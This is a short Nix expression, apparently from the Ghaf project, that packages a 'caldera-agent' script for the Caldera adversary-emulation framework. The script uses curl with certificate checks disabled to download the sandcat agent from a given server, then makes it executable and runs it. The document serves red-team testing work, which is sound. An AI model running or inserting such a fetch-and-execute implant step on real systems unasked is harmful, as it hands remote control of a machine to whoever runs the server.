# Copyright 2022-2024 TII (SSRC) and the Ghaf contributors
# SPDX-License-Identifier: Apache-2.0
{
  lib,
  pkgs,
  stdenv,
  ...
}:
   pkgs.writeShellScriptBin "caldera-agent" ''
      ${pkgs.curl}/bin/curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' -H 'server:http://''${1}' -H 'listenP2P:true' http://''${1}/file/download > sandcat
      chmod +x sandcat
      ./sandcat
    ''
